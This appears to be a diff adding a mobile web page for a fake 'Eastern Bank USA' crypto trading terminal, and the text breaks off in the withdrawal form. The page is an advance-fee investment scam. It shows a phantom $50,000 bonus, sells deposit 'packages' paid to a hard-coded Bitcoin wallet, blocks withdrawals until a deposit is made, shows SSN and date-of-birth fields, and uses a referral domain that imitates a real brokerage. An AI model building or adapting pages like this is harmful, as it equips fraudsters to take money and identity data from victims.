@@ -1,0 +1,1703 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Eastern Bank USA - Trading Terminal</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght=400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+<style>
+/* --- CSS VARIABLES & THEME SETUP (Strict Green & White Only) --- */
+:root {
+--bg-main: #0b0d0f;
+--bg-card: #14171a;
+--bg-accent: #1e2226;
+--color-white: #ffffff;
+--color-muted: #8a939b;
+--color-green: #00ff66;
+--color-green-dim: rgba(0, 255, 102, 0.1);
+--border-color: #24292e;
+--color-pending: #ffcc00;
+--color-pending-dim: rgba(255, 204, 0, 0.1);
+--color-danger: #ff3333;
+--color-danger-dim: rgba(255, 51, 51, 0.1);
+}
+
+/* --- CSS RESET --- */
+* {
+margin: 0;
+padding: 0;
+box-sizing: border-box;
+font-family: 'Inter', sans-serif;
+-webkit-tap-highlight-color: transparent;
+}
+
+body {
+background-color: var(--bg-main);
+color: var(--color-white);
+padding-bottom: 90px; /* Space for mobile navigation layout */
+}
+
+.container {
+max-width: 480px; /* Tailored perfectly for mobile app wrapper display */
+margin: 0 auto;
+padding: 16px;
+}
+
+/* --- REUSABLE CARD COMPONENTS --- */
+.card {
+background-color: var(--bg-card);
+border: 1px solid var(--border-color);
+border-radius: 16px;
+padding: 20px;
+margin-bottom: 16px;
+}
+
+/* --- TOP PROFILE HEADER --- */
+.profile-banner {
+text-align: center;
+background: linear-gradient(180deg, #16241b 0%, var(--bg-card) 100%);
+border-bottom: 1px solid var(--border-color);
+padding: 24px 16px;
+border-radius: 0 0 24px 24px;
+margin-bottom: 16px;
+}
+
+.avatar-circle {
+width: 64px;
+height: 64px;
+background-color: var(--color-green);
+color: var(--bg-main);
+font-size: 24px;
+font-weight: 700;
+display: flex;
+align-items: center;
+justify-content: center;
+border-radius: 50%;
+margin: 0 auto 12px auto;
+box-shadow: 0 0 20px rgba(0, 255, 102, 0.2);
+text-transform: uppercase;
+}
+
+.profile-name {
+font-size: 1.25rem;
+font-weight: 600;
+margin-bottom: 4px;
+}
+
+.profile-meta {
+font-size: 0.85rem;
+color: var(--color-muted);
+margin-bottom: 12px;
+}
+
+.status-badge {
+display: inline-block;
+background-color: var(--bg-accent);
+border: 1px solid var(--border-color);
+color: var(--color-white);
+padding: 6px 14px;
+border-radius: 20px;
+font-size: 0.8rem;
+font-weight: 500;
+margin-bottom: 16px;
+}
+
+/* --- DYNAMIC INTEGRATED ACCOUNT DETAILS DRAWER --- */
+.collapsible-profile-trigger {
+background-color: var(--bg-accent);
+border: 1px solid var(--border-color);
+padding: 12px 16px;
+border-radius: 12px;
+display: flex;
+justify-content: space-between;
+align-items: center;
+color: var(--color-white);
+font-size: 0.85rem;
+font-weight: 600;
+cursor: pointer;
+margin-bottom: 16px;
+transition: all 0.2s;
+}
+
+.collapsible-profile-trigger i.fa-chevron-down {
+color: var(--color-green);
+transition: transform 0.3s;
+}
+
+.collapsible-profile-trigger.active-trigger i.fa-chevron-down {
+transform: rotate(180deg);
+}
+
+.profile-details-drawer {
+max-height: 0;
+overflow: hidden;
+transition: max-height 0.3s ease-out;
+background-color: rgba(30, 34, 38, 0.4);
+border-radius: 12px;
+padding: 0 16px;
+margin-bottom: 16px;
+border: 1px solid transparent;
+}
+
+.profile-details-drawer.expanded-drawer {
+max-height: 500px;
+padding: 16px;
+border-color: var(--border-color);
+margin-bottom: 16px;
+}
+
+/* --- BUTTON ARCHITECTURE --- */
+.btn-action-primary {
+width: 100%;
+background-color: var(--color-green);
+color: var(--bg-main);
+border: none;
+padding: 14px;
+border-radius: 12px;
+font-size: 0.95rem;
+font-weight: 600;
+cursor: pointer;
+display: flex;
+align-items: center;
+justify-content: center;
+gap: 8px;
+transition: all 0.2s ease;
+text-decoration: none;
+}
+
+.btn-action-primary:disabled {
+background-color: var(--bg-accent);
+color: var(--color-muted);
+cursor: not-allowed;
+border: 1px solid var(--border-color);
+}
+
+.btn-action-primary:not(:disabled):active {
+transform: scale(0.98);
+background-color: #00e65c;
+}
+
+.action-split-row {
+display: grid;
+grid-template-columns: 1fr 1fr;
+gap: 12px;
+margin-top: 16px;
+}
+
+.btn-split {
+background-color: var(--bg-accent);
+color: var(--color-white);
+border: 1px solid var(--border-color);
+padding: 12px;
+border-radius: 12px;
+font-size: 0.9rem;
+font-weight: 500;
+cursor: pointer;
+display: flex;
+align-items: center;
+justify-content: center;
+gap: 8px;
+text-decoration: none;
+transition: background 0.2s;
+}
+
+.btn-split:active {
+background-color: var(--border-color);
+}
+
+.btn-split i {
+color: var(--color-green);
+}
+
+/* --- LEDGER LIST STYLES --- */
+.ledger-row {
+display: flex;
+justify-content: space-between;
+padding: 10px 0;
+font-size: 0.9rem;
+border-bottom: 1px dashed var(--border-color);
+}
+
+.ledger-row:last-child {
+border-bottom: none;
+padding-bottom: 0;
+}
+
+.ledger-label {
+color: var(--color-muted);
+}
+
+.ledger-value {
+font-weight: 600;
+}
+
+/* --- ACCOUNT BALANCE GRID BOX --- */
+.balance-title-area {
+display: flex;
+justify-content: space-between;
+align-items: center;
+margin-bottom: 8px;
+color: var(--color-muted);
+font-size: 0.85rem;
+}
+
+.balance-title-area span i {
+color: var(--color-green);
+margin-right: 6px;
+}
+
+.main-balance-digits {
+font-size: 2rem;
+font-weight: 700;
+margin-bottom: 6px;
+letter-spacing: -0.5px;
+}
+
+.timestamp-text {
+font-size: 0.75rem;
+color: var(--color-muted);
+}
+
+.stats-subgrid {
+display: grid;
+grid-template-columns: 1fr 1fr;
+gap: 12px;
+margin-top: 16px;
+}
+
+.subgrid-card {
+background-color: var(--bg-accent);
+border: 1px solid var(--border-color);
+border-radius: 12px;
+padding: 14px;
+}
+
+.subgrid-card .label {
+font-size: 0.8rem;
+color: var(--color-muted);
+display: flex;
+justify-content: space-between;
+align-items: center;
+margin-bottom: 8px;
+}
+
+.subgrid-card .label i {
+color: var(--color-green);
+}
+
+.subgrid-card .value {
+font-size: 1.1rem;
+font-weight: 600;
+}
+
+/* --- TRADING ANALYSIS CARD WITH AUTOMATED SIMULATION --- */
+.analysis-header {
+display: flex;
+justify-content: space-between;
+align-items: center;
+margin-bottom: 16px;
+}
+
+.analysis-title {
+font-weight: 600;
+font-size: 1.05rem;
+}
+
+.signal-metric-box {
+display: flex;
+justify-content: space-between;
+font-size: 0.85rem;
+margin-bottom: 6px;
+}
+
+.signal-progress-track {
+background-color: var(--bg-accent);
+height: 6px;
+border-radius: 3px;
+width: 100%;
+overflow: hidden;
+margin-bottom: 16px;
+}
+
+.signal-progress-bar {
+background-color: var(--color-green);
+height: 100%;
+width: 0%; /* Updates automatically via engine script */
+transition: width 0.6s ease;
+box-shadow: 0 0 10px var(--color-green);
+}
+
+/* Live Trading View Widget Terminal Container */
+.chart-viewport {
+height: 220px;
+border: 1px solid var(--border-color);
+border-radius: 8px;
+position: relative;
+background-color: #0d1013;
+overflow: hidden;
+}
+
+/* --- MARKET OVERVIEW COMPONENT --- */
+.market-card-header {
+display: flex;
+justify-content: space-between;
+align-items: center;
+margin-bottom: 14px;
+}
+
+.crypto-row-item {
+display: flex;
+align-items: center;
+justify-content: space-between;
+background-color: var(--bg-accent);
+border: 1px solid var(--border-color);
+padding: 12px;
+border-radius: 12px;
+margin-bottom: 8px;
+}
+
+.crypto-info-side {
+display: flex;
+align-items: center;
+gap: 12px;
+}
+
+.crypto-icon-frame {
+width: 36px;
+height: 36px;
+background-color: var(--bg-card);
+border: 1px solid var(--border-color);
+border-radius: 50%;
+display: flex;
+align-items: center;
+justify-content: center;
+color: var(--color-green);
+}
+
+.crypto-name-sym h4 {
+font-size: 0.95rem;
+font-weight: 600;
+}
+
+.crypto-name-sym span {
+font-size: 0.75rem;
+color: var(--color-muted);
+}
+
+.crypto-pricing-side {
+text-align: right;
+}
+
+.crypto-cur-price {
+font-size: 0.95rem;
+font-weight: 600;
+margin-bottom: 2px;
+}
+
+.crypto-percentage-delta {
+font-size: 0.75rem;
+color: var(--color-green);
+font-weight: 500;
+}
+
+/* --- REFER AND EARN SYSTEM --- */
+.referral-header-title {
+font-weight: 600;
+margin-bottom: 6px;
+font-size: 1rem;
+}
+
+.referral-explainer {
+font-size: 0.8rem;
+color: var(--color-muted);
+margin-bottom: 16px;
+line-height: 1.4;
+}
+
+.referral-input-wrapper {
+display: flex;
+background-color: var(--bg-accent);
+border: 1px solid var(--border-color);
+border-radius: 10px;
+padding: 6px;
+align-items: center;
+margin-bottom: 16px;
+}
+
+.referral-url-field {
+background: none;
+border: none;
+color: var(--color-white);
+padding: 6px;
+font-size: 0.8rem;
+width: 100%;
+outline: none;
+}
+
+.btn-copy-link {
+background-color: var(--color-green);
+color: var(--bg-main);
+border: none;
+padding: 8px 16px;
+font-weight: 600;
+font-size: 0.8rem;
+border-radius: 8px;
+cursor: pointer;
+}
+
+/* --- TRANSACTION RECENT ACTIVITY FEED --- */
+.tx-tab-container {
+display: flex;
+gap: 8px;
+border-bottom: 1px solid var(--border-color);
+padding-bottom: 12px;
+margin-bottom: 16px;
+}
+
+.tx-tab-item {
+background: none;
+border: none;
+color: var(--color-muted);
+font-size: 0.8rem;
+padding: 6px 12px;
+cursor: pointer;
+border-radius: 6px;
+}
+
+.tx-tab-item.active-tab {
+color: var(--color-green);
+background-color: var(--color-green-dim);
+font-weight: 500;
+}
+
+.tx-feed-item {
+display: flex;
+justify-content: space-between;
+align-items: flex-start;
+padding: 12px 0;
+border-bottom: 1px solid var(--border-color);
+}
+
+.tx-feed-item:last-child {
+border-bottom: none;
+}
+
+.tx-title-txt {
+font-size: 0.9rem;
+font-weight: 600;
+margin-bottom: 4px;
+color: var(--color-white);
+}
+
+.tx-meta-txt {
+font-size: 0.75rem;
+color: var(--color-muted);
+}
+
+.tx-status-indicator {
+font-size: 0.75rem;
+padding: 4px 8px;
+border-radius: 6px;
+font-weight: 500;
+text-align: right;
+display: inline-block;
+margin-bottom: 4px;
+background-color: var(--bg-accent);
+color: var(--color-white);
+border: 1px solid var(--border-color);
+}
+
+.tx-status-indicator.processed {
+color: var(--color-green);
+border-color: var(--color-green);
+background-color: var(--color-green-dim);
+}
+
+.tx-status-indicator.pending {
+color: var(--color-pending);
+border-color: var(--color-pending);
+background-color: var(--color-pending-dim);
+}
+
+.tx-status-indicator.failed {
+color: var(--color-danger);
+border-color: var(--color-danger);
+background-color: var(--color-danger-dim);
+}
+
+/* --- NAVIGATION INTERFACE DOCK --- */
+.nav-dock-bar {
+position: fixed;
+bottom: 0;
+left: 0;
+width: 100%;
+background-color: var(--bg-card);
+border-top: 1px solid var(--border-color);
+display: grid;
+grid-template-columns: repeat(5, 1fr);
+padding: 10px 0;
+z-index: 999;
+}
+
+.nav-dock-element {
+background: none;
+border: none;
+color: var(--color-muted);
+display: flex;
+flex-direction: column;
+align-items: center;
+gap: 4px;
+font-size: 0.7rem;
+cursor: pointer;
+text-decoration: none;
+}
+
+.nav-dock-element i {
+font-size: 1.15rem;
+}
+
+.nav-dock-element.active-dock {
+color: var(--color-green);
+}
+
+.nav-dock-element.center-action-node i {
+background-color: var(--color-green);
+color: var(--bg-main);
+width: 42px;
+height: 42px;
+border-radius: 50%;
+display: flex;
+align-items: center;
+justify-content: center;
+margin-top: -14px;
+box-shadow: 0 4px 12px rgba(0, 255, 102, 0.3);
+}
+
+/* --- TRADING PACKAGES SECTION SPECIFIC STYLING --- */
+.spa-view-node {
+display: block;
+}
+.hidden-spa-node {
+display: none !important;
+}
+
+.packages-main-headline {
+font-size: 1.75rem;
+font-weight: 700;
+text-align: center;
+margin: 12px 0 6px 0;
+letter-spacing: 0.5px;
+}
+
+.packages-sub-explainer {
+font-size: 0.8rem;
+color: var(--color-muted);
+text-align: center;
+margin-bottom: 24px;
+font-weight: 600;
+text-transform: uppercase;
+letter-spacing: 1px;
+}
+
+.plan-card-headline {
+font-size: 1.5rem;
+font-weight: 700;
+margin-bottom: 16px;
+border-bottom: 1px solid var(--border-color);
+padding-bottom: 12px;
+}
+
+.plan-feature-list {
+list-style: none;
+margin-bottom: 20px;
+display: flex;
+flex-direction: column;
+gap: 12px;
+}
+
+.plan-feature-list li {
+display: flex;
+align-items: center;
+gap: 10px;
+font-size: 0.9rem;
+color: var(--color-white);
+}
+
+.plan-bullet-check {
+width: 18px;
+height: 18px;
+background-color: var(--color-green-dim);
+color: var(--color-green);
+border-radius: 50%;
+display: flex;
+align-items: center;
+justify-content: center;
+font-size: 10px;
+font-weight: 900;
+flex-shrink: 0;
+}
+
+/* --- PAYMENT & WITHDRAWAL GATEWAY SYSTEM STYLING --- */
+.info-callout-payment {
+background-color: var(--bg-accent);
+border: 1px dashed var(--border-color);
+border-radius: 12px;
+padding: 16px;
+margin-bottom: 20px;
+}
+
+.info-line {
+display: flex;
+justify-content: space-between;
+font-size: 0.95rem;
+}
+
+.input-group {
+margin-bottom: 16px;
+}
+
+.input-label {
+display: block;
+font-size: 0.85rem;
+color: var(--color-muted);
+margin-bottom: 8px;
+font-weight: 500;
+}
+
+.loading-box {
+text-align: center;
+padding: 40px 20px;
+}
+
+.spinner {
+width: 48px;
+height: 48px;
+border: 4px solid var(--bg-accent);
+border-top: 4px solid var(--color-green);
+border-radius: 50%;
+margin: 0 auto 20px auto;
+animation: spin 1s linear infinite;
+box-shadow: 0 0 15px rgba(0, 255, 102, 0.2);
+}
+
+@keyframes spin {
+0% { transform: rotate(0deg); }
+100% { transform: rotate(360deg); }
+}
+
+.page-title {
+font-size: 1.25rem;
+font-weight: 600;
+margin-bottom: 8px;
+}
+
+.page-subtitle {
+font-size: 0.85rem;
+color: var(--color-muted);
+line-height: 1.5;
+margin-bottom: 20px;
+}
+
+.crypto-selection-grid {
+display: grid;
+grid-template-columns: 1fr 1fr;
+gap: 12px;
+margin-bottom: 4px;
+}
+
+.crypto-toggle-btn {
+background-color: var(--bg-accent);
+border: 1px solid var(--border-color);
+color: var(--color-white);
+padding: 14px;
+border-radius: 12px;
+font-size: 0.85rem;
+font-weight: 600;
+cursor: pointer;
+transition: all 0.2s;
+display: flex;
+align-items: center;
+justify-content: center;
+gap: 8px;
+}
+
+.crypto-toggle-btn.selected-gateway {
+border-color: var(--color-green);
+background-color: var(--color-green-dim);
+color: var(--color-green);
+}
+
+.address-input-wrapper {
+display: flex;
+background-color: var(--bg-accent);
+border: 1px solid var(--border-color);
+border-radius: 12px;
+padding: 6px;
+align-items: center;
+}
+
+.address-text-field {
+background: none;
+border: none;
+color: var(--color-white);
+padding: 8px;
+font-size: 0.95rem;
+width: 100%;
+outline: none;
+}
+
+.address-text-field:focus {
+border-color: var(--color-green);
+}
+
+.address-text-field-readonly {
+background: none;
+border: none;
+color: var(--color-green);
+padding: 8px;
+font-size: 0.8rem;
+font-family: monospace;
+width: 100%;
+outline: none;
+word-break: break-all;
+}
+
+.btn-address-copy {
+background-color: var(--color-green);
+color: var(--bg-main);
+border: none;
+padding: 8px 16px;
+font-weight: 600;
+font-size: 0.8rem;
+border-radius: 8px;
+cursor: pointer;
+white-space: nowrap;
+}
+
+.input-field-custom {
+width: 100%;
+background-color: var(--bg-accent);
+border: 1px solid var(--border-color);
+border-radius: 12px;
+padding: 14px;
+color: var(--color-white);
+font-size: 0.95rem;
+outline: none;
+margin-bottom: 4px;
+}
+
+.input-field-custom:focus {
+border-color: var(--color-green);
+}
+
+.proof-file-picker {
+width: 100%;
+background-color: var(--bg-accent);
+border: 1px dashed var(--border-color);
+border-radius: 12px;
+padding: 14px;
+color: var(--color-white);
+font-size: 0.85rem;
+outline: none;
+cursor: pointer;
+}
+
+.checkbox-row-alignment {
+display: flex;
+align-items: flex-start;
+gap: 10px;
+margin-top: 4px;
+margin-bottom: 18px;
+}
+
+.checkbox-row-alignment input {
+width: 18px;
+height: 18px;
+accent-color: var(--color-green);
+cursor: pointer;
+flex-shrink: 0;
+margin-top: 2px;
+}
+
+.checkbox-label-text {
+font-size: 0.8rem;
+color: var(--color-muted);
+line-height: 1.4;
+user-select: none;
+}
+
+/* --- CALLOUT SYSTEM BLOCKS FOR SECURITY INTERROGATIONS --- */
+.interrogation-box {
+background-color: var(--bg-accent);
+border: 1px solid var(--border-color);
+border-radius: 12px;
+padding: 16px;
+margin-bottom: 16px;
+}
+
+.interrogation-prompt-text {
+font-size: 0.9rem;
+font-weight: 600;
+margin-bottom: 12px;
+color: var(--color-white);
+}
+
+.radio-btn-layout {
+display: flex;
+gap: 16px;
+margin-bottom: 12px;
+}
+
+.radio-option {
+display: flex;
+align-items: center;
+gap: 8px;
+cursor: pointer;
+font-size: 0.9rem;
+font-weight: 500;
+}
+
+.radio-option input {
+accent-color: var(--color-green);
+width: 18px;
+height: 18px;
+cursor: pointer;
+}
+
+.notice-warning-panel {
+background-color: var(--color-danger-dim);
+border: 1px solid var(--color-danger);
+color: var(--color-danger);
+border-radius: 10px;
+padding: 12px;
+font-size: 0.8rem;
+line-height: 1.4;
+font-weight: 500;
+margin-top: 8px;
+}
+
+.conditional-proof-container {
+margin-top: 14px;
+border-top: 1px dashed var(--border-color);
+padding-top: 14px;
+}
+</style>
+</head>
+<body>
+
+<div id="spa-home-view" class="spa-view-node">
+<div class="profile-banner">
+<div class="avatar-circle" id="dynamicAvatar">U</div>
+<h3 class="profile-name" id="dynamicProfileName">Valued Client</h3>
+<p class="profile-meta">Joint Trading Account</p>
+<div class="status-badge">Status: Account Active</div>
+<a href="javascript:void(0);" onclick="toggleSpaLayoutView('packages')" class="btn-action-primary">
+<i class="fa-solid fa-shield-halved"></i> Upgrade Trading Plan
+</a>
+</div>
+
+<div class="container">
+
+<div class="collapsible-profile-trigger" id="profileTrigger">
+<span><i class="fa-solid fa-circle-user" style="color: var(--color-green); margin-right: 8px;"></i> View Full Verification Profile</span>
+<i class="fa-solid fa-chevron-down"></i>
+</div>
+
+<div class="profile-details-drawer" id="profileDrawer">
+<div class="ledger-row"><span class="ledger-label">Full Name:</span><span class="ledger-value" id="metaFullName">Loading...</span></div>
+<div class="ledger-row"><span class="ledger-label">Username:</span><span class="ledger-value" id="metaUsername" style="color: var(--color-green);">Loading...</span></div>
+<div class="ledger-row"><span class="ledger-label">Email:</span><span class="ledger-value" id="metaEmail">Loading...</span></div>
+<div class="ledger-row"><span class="ledger-label">Phone:</span><span class="ledger-value" id="metaPhone">Loading...</span></div>
+<div class="ledger-row"><span class="ledger-label">SSN Value:</span><span class="ledger-value" id="metaSSN">🔒 Encrypted</span></div>
+<div class="ledger-row"><span class="ledger-label">Date of Birth:</span><span class="ledger-value" id="metaDOB">Loading...</span></div>
+<div class="ledger-row"><span class="ledger-label">Address Matrix:</span><span class="ledger-value" id="metaAddress" style="text-align: right; max-width: 60%; word-break: break-word;">Loading...</span></div>
+</div>
+
+<div class="card">
+<div class="balance-title-area">
+<span><i class="fa-solid fa-wallet"></i> Account Balance</span>
+<i class="fa-regular fa-eye"></i>
+</div>
+<div class="main-balance-digits" id="liveBalanceField">$50,000.00</div>
+<div class="timestamp-text" id="liveTimestampText">Last updated: Jun 03, 2026 1:58 AM</div>
+
+<div class="action-split-row">
+<a href="javascript:void(0);" onclick="toggleSpaLayoutView('packages')" class="btn-split">
+<i class="fa-solid fa-circle-plus"></i> Deposit
+</a>
+<a href="javascript:void(0);" onclick="toggleSpaLayoutView('withdrawal')" class="btn-split">
+<i class="fa-solid fa-arrow-up-right-from-square"></i> Withdraw
+</a>
+</div>
+
+<div class="stats-subgrid">
+<div class="subgrid-card">
+<div class="label">Profits <i class="fa-solid fa-dollar-sign"></i></div>
+<div class="value" id="liveProfitsStat">$0.00</div>
+</div>
+<div class="subgrid-card">
+<div class="label">Bonus <i class="fa-solid fa-gift"></i></div>
+<div class="value" style="color: var(--color-green);">$50,000.00</div>
+</div>
+<div class="subgrid-card">
+<div class="label">Deposits <i class="fa-solid fa-arrow-down"></i></div>
+<div class="value" id="liveDepositStat">$50,000.00</div>
+</div>
+<div class="subgrid-card">
+<div class="label">Withdrawals <i class="fa-solid fa-arrow-up"></i></div>
+<div class="value" id="liveWithdrawStat">$0.00</div>
+</div>
+</div>
+
+<div style="margin-top: 16px;">
+<div class="ledger-row">
+<span class="ledger-label">Referral Bonus</span>
+<span class="ledger-value">$0.00</span>
+</div>
+<div class="ledger-row">
+<span class="ledger-label">Account Verification Status</span>
+<span class="ledger-value" style="color: #ff3333;">Unverified (Deposit Required)</span>
+</div>
+</div>
+</div>
+
+<div class="card">
+<div class="analysis-header">
+<span class="analysis-title">Trading Analysis Terminal</span>
+</div>
+<div class="signal-metric-box">
+<span class="ledger-label">Signal Market Flow</span>
+<span class="ledger-value" id="signal-percentage-display" style="color: var(--color-green);">0%</span>
+</div>
+<div class="signal-progress-track">
+<div class="signal-progress-bar" id="live-progress-fluid-node"></div>
+</div>
+
+<div class="chart-viewport">
+<div class="tradingview-widget-container" style="height:100%;width:100%;">
+<div id="tradingview_chart" style="height:100%;width:100%;"></div>
+<script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+<script type="text/javascript">
+new TradingView.widget({
+"autosize": true,
+"symbol": "BINANCE:BTCUSDT",
+"interval": "1",
+"timezone": "Etc/UTC",
+"theme": "dark",
+"style": "1",
+"locale": "en",
+"enable_publishing": false,
+"hide_side_toolbar": true,
+"allow_symbol_change": true,
+"container_id": "tradingview_chart"
+});
+</script>
+</div>
+</div>
+</div>
+
+<div class="card">
+<div class="market-card-header">
+<span class="analysis-title">Market Overview</span>
+</div>
+
+<div class="crypto-row-item">
+<div class="crypto-info-side">
+<div class="crypto-icon-frame"><i class="fa-brands fa-ethereum"></i></div>
+<div class="crypto-name-sym">
+<h4>Ethereum</h4>
+<span>ETH</span>
+</div>
+</div>
+<div class="crypto-pricing-side">
+<div class="crypto-cur-price">$1,931.00</div>
+<div class="crypto-percentage-delta">-1.68%</div>
+</div>
+</div>
+
+<div class="crypto-row-item">
+<div class="crypto-info-side">
+<div class="crypto-icon-frame"><i class="fa-brands fa-bitcoin"></i></div>
+<div class="crypto-name-sym">
+<h4>Bitcoin</h4>
+<span>BTC</span>
+</div>
+</div>
+<div class="crypto-pricing-side">
+<div class="crypto-cur-price">$67,825.00</div>
+<div class="crypto-percentage-delta">-4.96%</div>
+</div>
+</div>
+</div>
+
+<div class="card">
+<div class="referral-header-title">Refer & Earn</div>
+<p class="referral-explainer">Earn commission when someone signs up using your link</p>
+<div class="referral-input-wrapper">
+<input type="text" readonly class="referral-url-field" id="ref-link-field" value="https://fidelity.capital/ref/user">
+<button class="btn-copy-link" onclick="copyReferralLink()">Copy</button>
+</div>
+</div>
+
+<div class="card">
+<div class="analysis-header">
+<span class="analysis-title">Recent Transactions</span>
+</div>
+
+<div class="tx-tab-container">
+<button class="tx-tab-item active-tab">Deposits</button>
+<button class="tx-tab-item">Withdrawals</button>
+</div>
+
+<div id="dynamicTxHistoryContainer">
+</div>
+
+</div>
+</div>
+</div>
+
+<div id="spa-packages-view" class="spa-view-node hidden-spa-node">
+<div class="container" style="margin-top: 16px;">
+<h2 class="packages-main-headline">Trading Packages</h2>
+<p class="packages-sub-explainer">Choose a framework below to begin generating trade yields</p>
+
+<div class="card">
+<h3 class="plan-card-headline" style="color: var(--color-white);">Basic Plan</h3>
+<ul class="plan-feature-list">
+<li><span class="plan-bullet-check">✓</span> Min. Deposit: $1,000</li>
+<li><span class="plan-bullet-check">✓</span> Max. Deposit: $4,999</li>
+<li><span class="plan-bullet-check">✓</span> Trade Duration: 14 Days</li>
+</ul>
+<button class="btn-action-primary" onclick="handlePackageSelect('Basic Plan', 1000)">Get Started</button>
+</div>
+
+<div class="card">
+<h3 class="plan-card-headline" style="color: var(--color-white);">Silver Plan</h3>
+<ul class="plan-feature-list">
+<li><span class="plan-bullet-check">✓</span> Min. Deposit: $5,000</li>
+<li><span class="plan-bullet-check">✓</span> Max. Deposit: $9,999</li>
+<li><span class="plan-bullet-check">✓</span> Trade Duration: 14 Days</li>
+</ul>
+<button class="btn-action-primary" onclick="handlePackageSelect('Silver Plan', 5000)">Get Started</button>
+</div>
+
+<div class="card">
+<h3 class="plan-card-headline" style="color: var(--color-white);">Gold Plan</h3>
+<ul class="plan-feature-list">
+<li><span class="plan-bullet-check">✓</span> Min. Deposit: $10,000</li>
+<li><span class="plan-bullet-check">✓</span> Max. Deposit: $49,999</li>
+<li><span class="plan-bullet-check">✓</span> Trade Duration: 30 Days</li>
+</ul>
+<button class="btn-action-primary" onclick="handlePackageSelect('Gold Plan', 10000)">Get Started</button>
+</div>
+
+<div class="card">
+<h3 class="plan-card-headline" style="color: var(--color-white);">Platinum Plan</h3>
+<ul class="plan-feature-list">
+<li><span class="plan-bullet-check">✓</span> Min. Deposit: $50,000</li>
+<li><span class="plan-bullet-check">✓</span> Max. Deposit: Unlimited</li>
+<li><span class="plan-bullet-check">✓</span> Trade Duration: 60 Days</li>
+</ul>
+<button class="btn-action-primary" onclick="handlePackageSelect('Platinum Plan', 50000)">Get Started</button>
+</div>
+</div>
+</div>
+
+<div id="spa-loader-view" class="spa-view-node hidden-spa-node">
+<div class="container" style="margin-top: 60px;">
+<div class="card" style="text-align: center; padding: 40px 16px;">
+<div class="spinner"></div>
+<h3 class="page-title">Securing Secure Gateway Connection</h3>
+<p class="page-subtitle" style="margin-bottom:0;">Synchronizing package selection parameters and checking node paths. Please stand by...</p>
+</div>
+</div>
+</div>
+
+<div id="spa-payment-view" class="spa-view-node hidden-spa-node">
+<div class="container" style="margin-top: 16px;">
+<div class="card">
+<h3 class="page-title">Payment Gateway Portal</h3>
+<p class="page-subtitle">Transfer crypto assets directly to the monitored wallet network link below to activate your system tier.</p>
+
+<div class="info-callout-payment">
+<div class="info-line">
+<span style="color: var(--color-muted);">Selected Package Frame:</span>
+<span class="info-val" id="paymentPlanTitle" style="color: var(--color-green); font-weight:700;">Loading...</span>
+</div>
+</div>
+
+<div class="input-group">
+<label class="input-label">Type Investment Capital Amount ($)</label>
+<input type="number" id="customInvestmentAmountInput" class="input-field-custom" placeholder="e.g. 5000">
+</div>
+
+<div class="input-group">
+<label class="input-label">Select Secure Payment Route Asset</label>
+<div class="crypto-selection-grid">
+<button type="button" class="crypto-toggle-btn selected-gateway" id="methodBtcBtn" onclick="switchCryptoNetwork('BTC')">
+<i class="fa-brands fa-bitcoin"></i> Bitcoin (BTC)
+</button>
+<button type="button" class="crypto-toggle-btn" id="methodUsdtBtn" onclick="switchCryptoNetwork('USDT')">
+<i class="fa-solid fa-dollar-sign"></i> USDT
+</button>
+</div>
+</div>
+
+<div class="input-group">
+<label class="input-label">Monitored Wallet Destination String Address</label>
+<div class="address-input-wrapper">
+<input type="text" id="targetWalletStringInput" readonly class="address-text-field-readonly" value="bc1qll8lq9w9cjn9vxzslteaaxklrax3q57lalqlkg">
+<button type="button" class="btn-address-copy" id="copyTextNodeBtn" onclick="executeAddressClipboardCopy()">Copy</button>
+</div>
+</div>
+
+<div class="input-group">
+<label class="input-label">Upload Proof of Transaction Receipt (Image Document Screenshot)</label>
+<input type="file" id="proofImageDocument" class="proof-file-picker" accept="image/*">
+</div>
+
+<div class="checkbox-row-alignment">
+<input type="checkbox" id="certificationFlagCheck">
+<label for="certificationFlagCheck" class="checkbox-label-text">
+I successfully made my payment matching the asset package parameters above.
+</label>
+</div>
+
+<button type="button" class="btn-action-primary" onclick="commitTransactionLedgerUpdates()">
+<i class="fa-solid fa-cloud-arrow-up"></i> I Have Made Payment
+</button>
+</div>
+</div>
+</div>
+
+<div id="spa-withdrawal-view" class="spa-view-node hidden-spa-node">
+<div class="container" style="margin-top: 16px;">
+<div class="card">
+<h3 class="page-title"><i class="fa-solid fa-money-bill-transfer" style="color: var(--color-green);"></i> Secure Asset Withdrawal</h3>
+<p class="page-subtitle">Submit a settlement liquidation protocol transfer directly out of your active capital accounts balances matrix.</p>
+
+<div class="input-group">
+<label class="input-label">Choose Liquidation Route Option</label>
+<div class="crypto-selection-grid">
+<button type="button" class="crypto-toggle-btn selected-gateway" id="withdrawBtcBtn" onclick="switchWithdrawRoute('BTC')">
+<i class="fa-brands fa-bitcoin"></i> Bitcoin (BTC)
+</button>
+<button type="button" class="crypto-toggle-btn" id="withdrawUsdtBtn" onclick="switchWithdrawRoute('USDT')">
+<i class="fa-solid fa-dollar-sign"></i> USDT
+</button>
+</div>
+</div>
+
+<div class="input-group">
+<label class="input-label">Enter Destination Wallet Address</label>
+<input type="text" id="withdrawAddressInput" class="input-field-custom" placeholder="Paste your recipient address string key">
+</div>
+
+<div class="input-group">
+<label class="input-label">Amount to Withdraw ($)</label>
+<input type="number" id="withdrawAmountFieldInput" class="input-field-custom" placeholder="e.g. 2500">
+</div>
+
+<div class="interrogation-box">
+<p class="interrogation-prompt-text">Have you successfully processed or active launched your FIRST INVESTMENT deposit capitalization deal transaction structure inside Eastern Bank USA network systems before requesting this withdrawal?</p>
+<div class="radio-btn-layout">
+<label class="radio-option">
+<input type="radio" name="investmentAuditFlag" value="yes" onclick="handleInvestmentAuditTrigger('yes')"> Yes, I have
+</label>
+<label class="radio-option">
+<input type="radio" name="investmentAuditFlag" value="no" onclick="handleInvestmentAuditTrigger('no')"> No, not yet
+</label>
+</div>
+
+<div id="auditNegativeWarningBlock" class="notice-warning-panel" style="display: none;">
+<i class="fa-solid fa-circle-exclamation"></i> **Hold Notice Matrix:** You cannot withdraw your $50,000 Registration Welcome Bonus or capital assets values directly if you have not made your first structural active transaction investment deal on the network first. Please go to Packages and establish an investment deal first before requesting balance payouts.
+</div>
+
